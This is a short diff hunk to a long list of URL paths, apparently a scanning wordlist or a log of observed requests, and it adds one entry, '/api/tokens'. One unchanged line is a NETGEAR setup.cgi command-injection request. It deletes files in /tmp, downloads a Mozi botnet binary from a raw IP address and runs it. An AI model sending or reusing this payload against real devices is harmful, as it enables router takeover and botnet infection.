@@ -10440,3 +10440,4 @@ a
 /CDGServer3/SystemConfig
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.115.89.179:40678/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /fuel/login
+/api/tokens
